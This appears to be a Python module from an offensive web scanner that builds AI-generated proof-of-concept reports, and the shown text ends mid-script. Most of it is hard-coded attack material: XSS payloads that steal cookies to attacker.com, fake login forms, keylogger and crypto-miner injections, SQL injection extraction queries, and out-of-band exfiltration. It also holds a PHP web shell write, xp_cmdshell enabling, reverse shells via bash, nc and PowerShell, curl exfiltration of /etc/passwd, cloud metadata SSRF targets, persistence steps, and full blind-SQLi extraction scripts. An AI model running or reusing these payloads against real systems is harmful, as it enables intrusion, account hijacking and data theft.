"""POC Generator Module - Generates detailed Proof of Concept reports using LM Studio AI models.
Optimized for XSS vulnerabilities with automatic triggering when modules run individually."""

import asyncio
import json
import logging
from typing import Dict, List, Any, Optional
from datetime import datetime
from pathlib import Path

from ..core.hf_poc_reporter import hf_poc_reporter
from .base_module import SeverityLevel

logger = logging.getLogger(__name__)


class POCGenerator:
    """
    POC Generator that creates detailed exploitation reports for vulnerabilities.
    Optimized for XSS and other web vulnerabilities.
    """
    
    def __init__(self):
        """Initialize the POC Generator."""
        self.reporter = hf_poc_reporter
        self.xss_optimization_enabled = True
        
        # XSS-specific exploitation templates
        self.xss_templates = {
            'reflected': self._get_reflected_xss_template(),
            'stored': self._get_stored_xss_template(),
            'dom': self._get_dom_xss_template()
        }
        
        # Module-specific optimizations
        self.module_optimizations = {
            'xss_scanner': self._optimize_for_xss,
            'sql_injection': self._optimize_for_sqli,
            'command_injection': self._optimize_for_command_injection,
            'ssrf_scanner': self._optimize_for_ssrf,
            'rce_scanner': self._optimize_for_rce
        }
    
    async def generate_poc_for_module(
        self,
        target: str,
        module_name: str,
        scan_result: Dict[str, Any],
        auto_display: bool = True
    ) -> Dict[str, Any]:
        """
        Generate POC report for a specific module's scan results.
        
        Args:
            target: The target URL that was scanned
            module_name: Name of the scanner module
            scan_result: The scan results from the module
            auto_display: Whether to automatically display the POC
            
        Returns:
            Dictionary containing the POC report
        """
        try:
            # Check if there are vulnerabilities to generate POC for
            vulnerabilities = self._extract_vulnerabilities(scan_result)
            
            if not vulnerabilities:
                logger.info(f"No vulnerabilities found in {module_name} results. Skipping POC generation.")
                return {
                    "generated": False,
                    "message": "No vulnerabilities found to generate POC for",
                    "module": module_name,
                    "target": target
                }
            
            logger.info(f"Generating POC for {len(vulnerabilities)} vulnerabilities from {module_name}")
            
            # Apply module-specific optimizations
            if module_name in self.module_optimizations:
                scan_result = await self.module_optimizations[module_name](scan_result, vulnerabilities)
            
            # Generate the POC report using LM Studio
            poc_report = await self.reporter.generate_poc_report(
                target=target,
                module_name=module_name,
                scan_result=scan_result,
                params={
                    "max_new_tokens": 2000,
                    "temperature": 0.3,
                    "top_p": 0.95
                }
            )
            
            # Add module-specific enhancements
            if poc_report.get("generated"):
                poc_report = await self._enhance_poc_report(poc_report, module_name, vulnerabilities)
                
                # Auto-display if requested
                if auto_display:
                    self._display_poc_report(poc_report)
                
                # Save POC report
                self._save_poc_report(poc_report, target, module_name)
            
            return poc_report
            
        except Exception as e:
            logger.error(f"POC generation failed for {module_name}: {e}")
            return {
                "generated": False,
                "error": str(e),
                "module": module_name,
                "target": target
            }
    
    def _extract_vulnerabilities(self, scan_result: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Extract vulnerabilities from scan results."""
        vulnerabilities = []
        
        # Handle different result formats
        if isinstance(scan_result, dict):
            # Direct vulnerabilities list
            if 'vulnerabilities' in scan_result:
                vulns = scan_result['vulnerabilities']
                if isinstance(vulns, list):
                    vulnerabilities.extend(vulns)
            
            # Module results format
            if 'module_results' in scan_result:
                for module_data in scan_result['module_results'].values():
                    if isinstance(module_data, dict) and 'vulnerabilities' in module_data:
                        vulnerabilities.extend(module_data['vulnerabilities'])
        
        return vulnerabilities
    
    async def _optimize_for_xss(self, scan_result: Dict[str, Any], vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Apply XSS-specific optimizations to the scan result."""
        
        # Enhance vulnerability details with XSS-specific information
        for vuln in vulnerabilities:
            # Determine XSS type
            xss_type = self._determine_xss_type(vuln)
            vuln['xss_type'] = xss_type
            
            # Add exploitation complexity
            vuln['exploitation_complexity'] = self._assess_xss_complexity(vuln)
            
            # Add browser-specific notes
            vuln['browser_compatibility'] = self._get_browser_compatibility(vuln)
            
            # Add WAF bypass suggestions
            if vuln.get('evidence', {}).get('waf_detected'):
                vuln['waf_bypass_techniques'] = self._get_waf_bypass_techniques(vuln)
        
        # Add XSS-specific context to scan result
        scan_result['xss_optimization'] = {
            'total_xss_vulnerabilities': len(vulnerabilities),
            'xss_types_found': list(set(v.get('xss_type', 'unknown') for v in vulnerabilities)),
            'exploitation_guide': self._get_xss_exploitation_guide(),
            'payload_mutations': self._get_payload_mutations(vulnerabilities),
            'verification_methods': self._get_xss_verification_methods()
        }
        
        return scan_result
    
    def _determine_xss_type(self, vuln: Dict[str, Any]) -> str:
        """Determine the type of XSS vulnerability."""
        name = vuln.get('name', '').lower()
        desc = vuln.get('description', '').lower()
        
        if 'reflected' in name or 'reflected' in desc:
            return 'reflected'
        elif 'stored' in name or 'persistent' in name or 'stored' in desc:
            return 'stored'
        elif 'dom' in name or 'dom-based' in desc:
            return 'dom'
        else:
            return 'unknown'
    
    def _assess_xss_complexity(self, vuln: Dict[str, Any]) -> str:
        """Assess the exploitation complexity of an XSS vulnerability."""
        evidence = vuln.get('evidence', {})
        
        # Check for various factors
        if evidence.get('waf_detected'):
            return 'high'
        elif evidence.get('context') in ['javascript', 'event_handler']:
            return 'medium'
        elif evidence.get('context') in ['html_content', 'html_tag']:
            return 'low'
        else:
            return 'medium'
    
    def _get_browser_compatibility(self, vuln: Dict[str, Any]) -> Dict[str, bool]:
        """Get browser compatibility for XSS payloads."""
        payload = vuln.get('evidence', {}).get('payload', '')
        
        compatibility = {
            'chrome': True,
            'firefox': True,
            'safari': True,
            'edge': True,
            'ie': False
        }
        
        # Check for specific payload types
        if 'onerror' in payload or 'onload' in payload:
            compatibility['ie'] = True
        elif 'javascript:' in payload:
            compatibility['safari'] = False  # Safari has stricter javascript: URL handling
        
        return compatibility
    
    def _get_waf_bypass_techniques(self, vuln: Dict[str, Any]) -> List[str]:
        """Get WAF bypass techniques for XSS."""
        return [
            "Use HTML entity encoding: &lt;script&gt;",
            "Try Unicode encoding: \\u003cscript\\u003e",
            "Use case variations: <ScRiPt>",
            "Insert null bytes: <scr%00ipt>",
            "Use HTML5 events: <video onloadstart=alert(1)>",
            "Try polyglot payloads: javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "Use data URIs: <object data='data:text/html,<script>alert(1)</script>'>",
            "Leverage JSONP endpoints if available"
        ]
    
    def _get_xss_exploitation_guide(self) -> Dict[str, Any]:
        """Get XSS exploitation guide."""
        return {
            "reflected_xss": {
                "steps": [
                    "1. Identify the injection point and context",
                    "2. Craft payload based on context (HTML, JS, attribute)",
                    "3. Encode payload if necessary (URL encoding for GET params)",
                    "4. Create proof-of-concept link",
                    "5. Test in different browsers",
                    "6. Document impact (cookie theft, phishing, etc.)"
                ],
                "example_payloads": [
                    "<script>alert(document.cookie)</script>",
                    "<img src=x onerror='fetch(\"http://attacker.com/steal?c=\"+document.cookie)'>",
                    "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://attacker.com/hook.js\\';document.body.appendChild(a)')"
                ]
            },
            "stored_xss": {
                "steps": [
                    "1. Identify persistent input fields",
                    "2. Submit XSS payload to storage",
                    "3. Verify payload persistence",
                    "4. Identify all reflection points",
                    "5. Document affected users/pages",
                    "6. Create automated exploitation script"
                ],
                "example_payloads": [
                    "<script>new Image().src='http://attacker.com/log?c='+document.cookie</script>",
                    "<svg onload='eval(atob(\"base64_encoded_payload\"))'>",
                    "<iframe src='javascript:alert(1)' style='display:none'>"
                ]
            },
            "dom_xss": {
                "steps": [
                    "1. Identify DOM sinks (innerHTML, eval, document.write)",
                    "2. Trace data flow from source to sink",
                    "3. Craft payload for specific sink",
                    "4. Use fragment identifiers (#) for exploitation",
                    "5. Test with browser developer tools",
                    "6. Create proof-of-concept with hash-based payload"
                ],
                "example_payloads": [
                    "#<img src=x onerror=alert(1)>",
                    "#javascript:alert(1)",
                    "#'-alert(1)-'"
                ]
            }
        }
    
    def _get_payload_mutations(self, vulnerabilities: List[Dict[str, Any]]) -> List[str]:
        """Generate payload mutations based on found vulnerabilities."""
        mutations = []
        
        for vuln in vulnerabilities:
            original_payload = vuln.get('evidence', {}).get('payload', '')
            if original_payload:
                # Generate mutations
                mutations.extend([
                    original_payload.upper(),
                    original_payload.lower(),
                    original_payload.replace('<', '%3C').replace('>', '%3E'),
                    original_payload.replace('<', '&lt;').replace('>', '&gt;'),
                    original_payload.replace('script', 'ScRiPt'),
                    original_payload.replace(' ', '/**/')
                ])
        
        return list(set(mutations))[:20]  # Return unique mutations, max 20
    
    def _get_xss_verification_methods(self) -> List[str]:
        """Get methods to verify XSS vulnerabilities."""
        return [
            "1. Browser Console Check: Look for executed JavaScript in console",
            "2. DOM Inspector: Check if payload is rendered in DOM",
            "3. Network Monitor: Verify external resource loading",
            "4. Cookie Theft Test: Attempt to exfiltrate document.cookie",
            "5. Screenshot Capture: Use browser automation to capture proof",
            "6. Payload Callback: Set up listener for payload callbacks",
            "7. Browser Extensions: Disable XSS auditors for testing",
            "8. Multiple Browsers: Test across Chrome, Firefox, Safari, Edge"
        ]
    
    async def _optimize_for_sqli(self, scan_result: Dict[str, Any], vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Apply comprehensive SQL injection-specific optimizations."""
        
        # Analyze vulnerabilities for detailed optimization
        for vuln in vulnerabilities:
            evidence = vuln.get('evidence', {})
            
            # Determine SQL injection type and add specific exploitation guidance
            injection_type = evidence.get('injection_type', 'Unknown')
            vuln['sqli_type'] = injection_type
            
            # Add database-specific information
            db_type = evidence.get('database_type', 'Unknown')
            vuln['database_type'] = db_type
            
            # Add exploitation complexity based on detection method
            vuln['exploitation_complexity'] = self._assess_sqli_complexity(vuln)
            
            # Add specific exploitation techniques
            vuln['exploitation_techniques'] = self._get_sqli_exploitation_techniques(injection_type, db_type)
            
            # Add data extraction methods
            vuln['data_extraction_methods'] = self._get_data_extraction_methods(injection_type, db_type)
        
        # Enhanced SQL injection optimization with database-specific payloads
        scan_result['sqli_optimization'] = {
            'vulnerability_summary': {
                'total_sqli_vulnerabilities': len(vulnerabilities),
                'injection_types_found': list(set(v.get('sqli_type', 'unknown') for v in vulnerabilities)),
                'databases_identified': list(set(v.get('database_type', 'unknown') for v in vulnerabilities if v.get('database_type'))),
                'affected_parameters': list(set(v.get('evidence', {}).get('parameter', '') for v in vulnerabilities if v.get('evidence', {}).get('parameter')))
            },
            
            'database_fingerprinting': {
                'mysql': {
                    'version': "SELECT @@version",
                    'database': "SELECT database()",
                    'user': "SELECT user()",
                    'privileges': "SELECT * FROM mysql.user WHERE user = current_user()",
                    'all_databases': "SELECT schema_name FROM information_schema.schemata"
                },
                'postgresql': {
                    'version': "SELECT version()",
                    'database': "SELECT current_database()",
                    'user': "SELECT current_user",
                    'privileges': "SELECT * FROM pg_roles WHERE rolname = current_user",
                    'all_databases': "SELECT datname FROM pg_database"
                },
                'mssql': {
                    'version': "SELECT @@version",
                    'database': "SELECT DB_NAME()",
                    'user': "SELECT SYSTEM_USER",
                    'privileges': "SELECT * FROM fn_my_permissions(NULL, 'SERVER')",
                    'all_databases': "SELECT name FROM master.sys.databases"
                },
                'oracle': {
                    'version': "SELECT * FROM v$version",
                    'database': "SELECT ora_database_name FROM dual",
                    'user': "SELECT user FROM dual",
                    'privileges': "SELECT * FROM session_privs",
                    'all_databases': "SELECT DISTINCT owner FROM all_tables"
                }
            },
            
            'data_extraction_queries': {
                'mysql': [
                    "-- Extract table names",
                    "UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
                    "-- Extract column names",
                    "UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                    "-- Extract data with CONCAT",
                    "UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users--",
                    "-- Extract with GROUP_CONCAT for multiple rows",
                    "UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x3c62723e),NULL FROM users--"
                ],
                'postgresql': [
                    "-- Extract table names",
                    "UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='public'--",
                    "-- Extract column names",
                    "UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                    "-- Extract data with concatenation",
                    "UNION SELECT NULL,username||':'||password,NULL FROM users--",
                    "-- Extract with string_agg for multiple rows",
                    "UNION SELECT NULL,string_agg(username||':'||password, ','),NULL FROM users--"
                ],
                'mssql': [
                    "-- Extract table names",
                    "UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--",
                    "-- Extract column names",
                    "UNION SELECT NULL,name,NULL FROM syscolumns WHERE id=OBJECT_ID('users')--",
                    "-- Extract data with concatenation",
                    "UNION SELECT NULL,username+':'+password,NULL FROM users--",
                    "-- Extract with FOR XML PATH",
                    "UNION SELECT NULL,(SELECT username+':'+password FROM users FOR XML PATH('')),NULL--"
                ],
                'generic': [
                    "-- Basic UNION extraction",
                    "UNION SELECT NULL,@@version,NULL--",
                    "UNION SELECT NULL,database(),NULL--",
                    "UNION SELECT NULL,user(),NULL--"
                ]
            },
            
            'blind_sqli_techniques': {
                'boolean_based': {
                    'description': "Extract data bit by bit using true/false conditions",
                    'examples': [
                        "' AND SUBSTRING(database(),1,1)='a'--",
                        "' AND ASCII(SUBSTRING(database(),1,1))>97--",
                        "' AND (SELECT COUNT(*) FROM users)>0--",
                        "' AND LENGTH(database())=8--"
                    ],
                    'automation': "Use binary search to speed up character extraction"
                },
                'time_based': {
                    'description': "Extract data using time delays",
                    'mysql': [
                        "' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--",
                        "' AND (SELECT IF(COUNT(*)>0,SLEEP(5),0) FROM users)--"
                    ],
                    'postgresql': [
                        "'; SELECT CASE WHEN (SUBSTRING(database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--"
                    ],
                    'mssql': [
                        "'; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '00:00:05'--"
                    ]
                },
                'error_based': {
                    'description': "Extract data through error messages",
                    'mysql': [
                        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
                        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--",
                        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
                    ],
                    'postgresql': [
                        "' AND 1=CAST((SELECT database()) AS int)--"
                    ],
                    'mssql': [
                        "' AND 1=CONVERT(int,DB_NAME())--"
                    ]
                }
            },
            
            'advanced_techniques': {
                'second_order': {
                    'description': "Exploit stored SQL injection vulnerabilities",
                    'steps': [
                        "1. Identify input fields that store data",
                        "2. Submit malicious SQL as stored data",
                        "3. Trigger execution on different page/function",
                        "4. Extract data through secondary injection point"
                    ]
                },
                'out_of_band': {
                    'description': "Extract data via DNS or HTTP requests",
                    'mysql': "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\a'))--",
                    'mssql': "'; EXEC master..xp_dirtree '\\\\'+DB_NAME()+'.attacker.com\\a'--",
                    'oracle': "' UNION SELECT UTL_INADDR.get_host_address((SELECT user FROM dual)||'.attacker.com') FROM dual--"
                },
                'waf_evasion': {
                    'description': "Techniques to bypass Web Application Firewalls",
                    'methods': [
                        "Comment obfuscation: /**/UNION/**/SELECT",
                        "Case variation: UnIoN SeLeCt",
                        "Encoding: %55nion %53elect",
                        "Double encoding: %2555nion %2553elect",
                        "Inline comments: /*!50000UNION*/ /*!50000SELECT*/",
                        "Alternative whitespace: UNION%0aSELECT",
                        "Parameter pollution: id=1&id=' UNION SELECT",
                        "HTTP Parameter Fragmentation: id=1' UN/*&id=*/ION SEL/*&id=*/ECT"
                    ]
                }
            },
            
            'automation_tools': {
                'sqlmap': {
                    'basic': "sqlmap -u 'http://target.com/page?id=1' --batch --random-agent",
                    'aggressive': "sqlmap -u 'http://target.com/page?id=1' --level=5 --risk=3 --threads=10",
                    'database_dump': "sqlmap -u 'http://target.com/page?id=1' --dump -D database_name",
                    'specific_table': "sqlmap -u 'http://target.com/page?id=1' --dump -D database_name -T users",
                    'tamper_scripts': "sqlmap -u 'http://target.com/page?id=1' --tamper=space2comment,between"
                },
                'custom_scripts': {
                    'python_boolean': self._get_python_boolean_extraction_script(),
                    'python_time': self._get_python_time_extraction_script()
                }
            },
            
            'post_exploitation': {
                'file_operations': {
                    'mysql': [
                        "-- Read files",
                        "UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--",
                        "-- Write files (requires FILE privilege)",
                        "UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--"
                    ],
                    'mssql': [
                        "-- Enable xp_cmdshell",
                        "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
                        "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
                        "-- Execute commands",
                        "EXEC xp_cmdshell 'whoami'"
                    ]
                },
                'privilege_escalation': [
                    "Check current privileges",
                    "Look for stored procedures with DEFINER rights",
                    "Exploit UDF (User Defined Functions) if possible",
                    "Check for database links (Oracle)",
                    "Attempt to create new admin users"
                ]
            },
            
            'remediation_verification': {
                'test_after_fix': [
                    "Verify parameterized queries are implemented",
                    "Test with all original payloads",
                    "Check for proper input validation",
                    "Ensure error messages don't leak information",
                    "Verify least privilege principle is applied"
                ]
            }
        }
        
        return scan_result
    
    def _assess_sqli_complexity(self, vuln: Dict[str, Any]) -> str:
        """Assess the exploitation complexity of a SQL injection vulnerability."""
        evidence = vuln.get('evidence', {})
        injection_type = evidence.get('injection_type', '')
        
        # Check various factors
        if 'Error-Based' in injection_type:
            return 'low'  # Direct error messages make exploitation easier
        elif 'Union' in injection_type:
            return 'low'  # UNION-based is straightforward
        elif 'Boolean' in injection_type:
            return 'medium'  # Requires more requests but automatable
        elif 'Time-Based' in injection_type:
            return 'high'  # Slow and requires patience
        elif 'Second-Order' in injection_type:
            return 'high'  # Complex multi-step process
        else:
            return 'medium'
    
    def _get_sqli_exploitation_techniques(self, injection_type: str, db_type: str) -> List[str]:
        """Get specific exploitation techniques based on injection type and database."""
        techniques = []
        
        if 'Error' in injection_type:
            techniques.extend([
                "Use error messages to extract database version and structure",
                "Leverage database-specific error functions for data extraction",
                "Chain multiple error-based queries for faster extraction"
            ])
        
        if 'Boolean' in injection_type or 'Blind' in injection_type:
            techniques.extend([
                "Implement binary search algorithm for faster character extraction",
                "Use CASE statements for conditional responses",
                "Automate with custom scripts for efficiency"
            ])
        
        if 'Time' in injection_type:
            techniques.extend([
                "Use statistical analysis to confirm time delays",
                "Implement parallel extraction for multiple characters",
                "Adjust delay times based on network latency"
            ])
        
        if 'Union' in injection_type:
            techniques.extend([
                "Determine number of columns with ORDER BY or NULL values",
                "Find injectable columns that display output",
                "Use CONCAT/GROUP_CONCAT for efficient data extraction"
            ])
        
        # Add database-specific techniques
        if db_type == 'MySQL':
            techniques.append("Use MySQL-specific functions like DATABASE(), USER(), @@version")
        elif db_type == 'PostgreSQL':
            techniques.append("Leverage PostgreSQL's COPY command for file operations")
        elif db_type == 'MSSQL':
            techniques.append("Exploit xp_cmdshell for command execution if available")
        
        return techniques
    
    def _get_data_extraction_methods(self, injection_type: str, db_type: str) -> Dict[str, Any]:
        """Get data extraction methods based on injection type and database."""
        methods = {
            'primary_method': '',
            'alternative_methods': [],
            'automation_possible': False,
            'estimated_time': ''
        }
        
        if 'Union' in injection_type:
            methods['primary_method'] = "Direct extraction via UNION SELECT"
            methods['alternative_methods'] = ["Use GROUP_CONCAT or similar for bulk extraction"]
            methods['automation_possible'] = True
            methods['estimated_time'] = "Minutes for full database dump"
        elif 'Error' in injection_type:
            methods['primary_method'] = "Extract data through error messages"
            methods['alternative_methods'] = ["Use EXTRACTVALUE, UPDATEXML, or similar"]
            methods['automation_possible'] = True
            methods['estimated_time'] = "Minutes to hours depending on data size"
        elif 'Boolean' in injection_type:
            methods['primary_method'] = "Character-by-character extraction using boolean conditions"
            methods['alternative_methods'] = ["Binary search optimization", "Parallel extraction"]
            methods['automation_possible'] = True
            methods['estimated_time'] = "Hours for significant data extraction"
        elif 'Time' in injection_type:
            methods['primary_method'] = "Bit-by-bit extraction using time delays"
            methods['alternative_methods'] = ["Heavy queries for more reliable delays"]
            methods['automation_possible'] = True
            methods['estimated_time'] = "Hours to days for full extraction"
        
        return methods
    
    def _get_python_boolean_extraction_script(self) -> str:
        """Generate Python script for boolean-based blind SQL injection."""
        return """#!/usr/bin/env python3
# Boolean-based blind SQL injection data extraction script

import requests
import string

def extract_data(url, param, prefix, suffix):
    extracted = ""
    charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    
    # Extract length first
    length = 0
    for i in range(1, 100):
        payload = f"{prefix} AND LENGTH(database())={i}{suffix}"
        r = requests.get(url, params={param: payload})
        if "expected_true_response" in r.text:
            length = i
            break
    
    print(f"[+] Length: {length}")
    
    # Extract data character by character
    for position in range(1, length + 1):
        for char in charset:
            payload = f"{prefix} AND SUBSTRING(database(),{position},1)='{char}'{suffix}"
            r = requests.get(url, params={param: payload})
            
            if "expected_true_response" in r.text:
                extracted += char
                print(f"[+] Extracted: {extracted}")
                break
    
    return extracted

# Usage
target_url = "http://vulnerable.com/page"
extract_data(target_url, "id", "1", "--")
"""
    
    def _get_python_time_extraction_script(self) -> str:
        """Generate Python script for time-based blind SQL injection."""
        return """#!/usr/bin/env python3
# Time-based blind SQL injection data extraction script

import requests
import time
import string

def extract_data_time_based(url, param, prefix, suffix, delay=5):
    extracted = ""
    charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    
    # Extract data character by character
    for position in range(1, 50):  # Adjust max length as needed
        found_char = False
        
        for char in charset:
            # MySQL example - adjust for other databases
            payload = f"{prefix} AND IF(SUBSTRING(database(),{position},1)='{char}',SLEEP({delay}),0){suffix}"
            
            start_time = time.time()
            try:
                r = requests.get(url, params={param: payload}, timeout=delay+2)
                elapsed = time.time() - start_time
                
                if elapsed >= delay:
                    extracted += char
                    print(f"[+] Position {position}: {char} | Extracted: {extracted}")
                    found_char = True
                    break
            except requests.Timeout:
                extracted += char
                print(f"[+] Position {position}: {char} | Extracted: {extracted}")
                found_char = True
                break
        
        if not found_char:
            break  # No more characters
    
    return extracted

# Usage
target_url = "http://vulnerable.com/page"
extract_data_time_based(target_url, "id", "1", "--", delay=3)
"""
    
    async def _optimize_for_command_injection(self, scan_result: Dict[str, Any], vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Apply command injection-specific optimizations."""
        scan_result['command_injection_optimization'] = {
            'os_detection_commands': [
                "uname -a",
                "ver",
                "echo %OS%"
            ],
            'reverse_shell_payloads': [
                "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                "nc -e /bin/sh attacker.com 4444",
                "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444)\""
            ],
            'data_exfiltration': [
                "curl http://attacker.com/steal?data=$(cat /etc/passwd | base64)",
                "wget http://attacker.com/steal?data=`whoami`"
            ]
        }
        return scan_result
    
    async def _optimize_for_ssrf(self, scan_result: Dict[str, Any], vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Apply SSRF-specific optimizations."""
        scan_result['ssrf_optimization'] = {
            'internal_service_discovery': [
                "http://localhost:8080",
                "http://127.0.0.1:22",
                "http://169.254.169.254/latest/meta-data/"
            ],
            'protocol_smuggling': [
                "file:///etc/passwd",
                "gopher://localhost:3306",
                "dict://localhost:11211"
            ],
            'cloud_metadata_endpoints': [
                "AWS: http://169.254.169.254/latest/meta-data/",
                "GCP: http://metadata.google.internal/computeMetadata/v1/",
                "Azure: http://169.254.169.254/metadata/instance"
            ]
        }
        return scan_result
    
    async def _optimize_for_rce(self, scan_result: Dict[str, Any], vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Apply RCE-specific optimizations."""
        scan_result['rce_optimization'] = {
            'code_execution_payloads': [
                "PHP: <?php system($_GET['cmd']); ?>",
                "Python: __import__('os').system('id')",
                "Java: Runtime.getRuntime().exec('whoami')"
            ],
            'persistence_techniques': [
                "Add SSH key to authorized_keys",
                "Create web shell in web root",
                "Add cron job for reverse shell"
            ],
            'privilege_escalation': [
                "Check sudo permissions: sudo -l",
                "Find SUID binaries: find / -perm -4000 2>/dev/null",
                "Kernel exploits based on version"
            ]
        }
        return scan_result
    
    async def _enhance_poc_report(self, poc_report: Dict[str, Any], module_name: str, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Enhance the POC report with additional module-specific information."""
        
        # Add vulnerability summary
        poc_report['vulnerability_summary'] = {
            'total_count': len(vulnerabilities),
            'severity_breakdown': self._get_severity_breakdown(vulnerabilities),
            'affected_endpoints': self._get_affected_endpoints(vulnerabilities),
            'exploitation_difficulty': self._assess_overall_difficulty(vulnerabilities)
        }
        
        # Add module-specific enhancements
        if module_name == 'xss_scanner':
            poc_report['xss_specific'] = {
                'payload_examples': self._get_xss_payload_examples(vulnerabilities),
                'exploitation_scenarios': self._get_xss_scenarios(),
                'mitigation_bypass': self._get_mitigation_bypass_techniques()
            }
        
        # Add automation scripts
        poc_report['automation'] = {
            'verification_script': self._generate_verification_script(module_name, vulnerabilities),
            'exploitation_script': self._generate_exploitation_script(module_name, vulnerabilities)
        }
        
        return poc_report
    
    def _get_severity_breakdown(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, int]:
        """Get breakdown of vulnerabilities by severity."""
        breakdown = {
            'critical': 0,
            'high': 0,
            'medium': 0,
            'low': 0,
            'info': 0
        }
        
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'info')
            if isinstance(severity, str):
                severity_key = severity.lower()
            else:
                # Handle SeverityLevel enum
                severity_key = severity.value if hasattr(severity, 'value') else 'info'
            
            if severity_key in breakdown:
                breakdown[severity_key] += 1
        
        return breakdown
    
    def _get_affected_endpoints(self, vulnerabilities: List[Dict[str, Any]]) -> List[str]:
        """Get list of affected endpoints."""
        endpoints = set()
        
        for vuln in vulnerabilities:
            affected_urls = vuln.get('affected_urls', [])
            endpoints.update(affected_urls)
        
        return list(endpoints)
    
    def _assess_overall_difficulty(self, vulnerabilities: List[Dict[str, Any]]) -> str:
        """Assess overall exploitation difficulty."""
        if not vulnerabilities:
            return 'none'
        
        difficulties = []
        for vuln in vulnerabilities:
            complexity = vuln.get('exploitation_complexity', 'medium')
            difficulties.append(complexity)
        
        # Return the most common difficulty
        if 'high' in difficulties:
            return 'high'
        elif 'medium' in difficulties:
            return 'medium'
        else:
            return 'low'
    
    def _get_xss_payload_examples(self, vulnerabilities: List[Dict[str, Any]]) -> List[str]:
        """Get XSS payload examples based on found vulnerabilities."""
        payloads = []
        
        for vuln in vulnerabilities:
            evidence = vuln.get('evidence', {})
            context = evidence.get('context', 'html_content')
            
            if context == 'javascript':
                payloads.append("';alert(String.fromCharCode(88,83,83))//")
            elif context == 'event_handler':
                payloads.append("' onmouseover='alert(1)")
            elif context == 'html_attribute':
                payloads.append('"><script>alert(1)</script>')
            else:
                payloads.append('<script>alert(document.domain)</script>')
        
        return list(set(payloads))[:10]
    
    def _get_xss_scenarios(self) -> List[Dict[str, str]]:
        """Get XSS exploitation scenarios."""
        return [
            {
                "name": "Session Hijacking",
                "description": "Steal user session cookies and impersonate them",
                "payload": "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"
            },
            {
                "name": "Phishing Attack",
                "description": "Create fake login form to steal credentials",
                "payload": "<script>document.body.innerHTML='<form action=http://attacker.com/phish>Username:<input name=u><br>Password:<input type=password name=p><br><input type=submit></form>'</script>"
            },
            {
                "name": "Keylogger Installation",
                "description": "Install JavaScript keylogger to capture user input",
                "payload": "<script src='http://attacker.com/keylogger.js'></script>"
            },
            {
                "name": "Cryptocurrency Mining",
                "description": "Inject crypto miner to use victim's resources",
                "payload": "<script src='https://coinhive.com/lib/coinhive.min.js'></script>"
            }
        ]
    
    def _get_mitigation_bypass_techniques(self) -> List[str]:
        """Get techniques to bypass XSS mitigations."""
        return [
            "CSP Bypass: Use JSONP endpoints or unsafe-inline directives",
            "Filter Evasion: Use encoding, case variations, or HTML5 tags",
            "WAF Bypass: Split payloads, use polyglots, or time-based evasion",
            "Framework Bypass: Target framework-specific sinks (Angular, React, Vue)",
            "Browser Auditor Bypass: Use data URIs or srcdoc attributes"
        ]
    
    def _generate_verification_script(self, module_name: str, vulnerabilities: List[Dict[str, Any]]) -> str:
        """Generate a verification script for the vulnerabilities."""
        if module_name == 'xss_scanner':
            return """#!/usr/bin/env python3
# XSS Vulnerability Verification Script

import requests
import sys

def verify_xss(url, param, payload):
    try:
        # Test reflected XSS
        response = requests.get(url, params={param: payload})
        if payload in response.text:
            print(f"[+] XSS confirmed at {url} in parameter '{param}'")
            return True
        else:
            print(f"[-] XSS not confirmed at {url}")
            return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

# Example usage
if __name__ == "__main__":
    target_url = sys.argv[1] if len(sys.argv) > 1 else "http://example.com/search"
    verify_xss(target_url, "q", "<script>alert(1)</script>")
"""
        else:
            return "# Verification script for " + module_name
    
    def _generate_exploitation_script(self, module_name: str, vulnerabilities: List[Dict[str, Any]]) -> str:
        """Generate an exploitation script for the vulnerabilities."""
        if module_name == 'xss_scanner':
            return """#!/usr/bin/env python3
# XSS Exploitation Script

import requests
import base64

def exploit_xss(url, param):
    # Payload to steal cookies
    payload = "<script>fetch('http://attacker.com/steal?c='+btoa(document.cookie))</script>"
    
    # Send exploit
    exploit_url = f"{url}?{param}={payload}"
    print(f"[*] Exploit URL: {exploit_url}")
    
    # Set up listener on attacker.com to receive cookies
    print("[*] Set up listener: nc -lvp 80")
    
    return exploit_url

# Example usage
if __name__ == "__main__":
    target = "http://vulnerable.com/search"
